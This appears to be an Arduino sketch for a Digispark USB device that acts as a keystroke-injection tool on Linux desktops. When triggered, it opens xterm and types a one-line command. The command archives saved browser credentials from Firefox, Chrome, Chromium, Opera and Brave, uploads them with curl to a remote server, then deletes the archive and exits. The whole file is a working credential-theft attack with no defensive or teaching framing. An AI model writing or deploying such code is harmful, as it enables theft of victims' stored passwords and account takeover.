#include <DigiKeyboard.h>

void setup() {
  pinMode(1, INPUT_PULLUP);
  DigiKeyboard.delay(5000);
}

void loop() {
  if (digitalRead(1) == LOW) {
    switch_to_tty_and_root();
    delay(60000);
  }
}

void switch_to_tty_and_root() {

  //DigiKeyboard.sendKeyStroke(KEY_F2, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(0);
   delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_ALT_LEFT);
  delay(800);
  DigiKeyboard.print("xterm");
  delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(800);

  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT| MOD_ALT_LEFT);
  delay(800);
   DigiKeyboard.print("xterm");
   delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000); // Ждать запуска xterm

  // 4. Ввести однострочный скрипт и выполнить
 
  DigiKeyboard.print("TMPFILE=\"/tmp/bd_$(date +%s%N).tar.gz\"; tar -czf \"$TMPFILE\" ~/.mozilla/firefox/*/{logins.json,key4.db,cert9.db} ~/.config/google-chrome/Default/Login\\\\ Data ~/.config/chromium/Default/Login\\\\ Data ~/.config/opera/Login\\\\ Data ~/.config/brave/Default/Login\\\\ Data 2>/dev/null ; curl -X POST -F file=@\"$TMPFILE\" http://xxxx:8000/pub 2>/dev/null ; rm -f \"$TMPFILE\" ");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 delay(2000);

DigiKeyboard.print("exit");
   delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Остановка
  while (1) {
    delay(100);
  }
}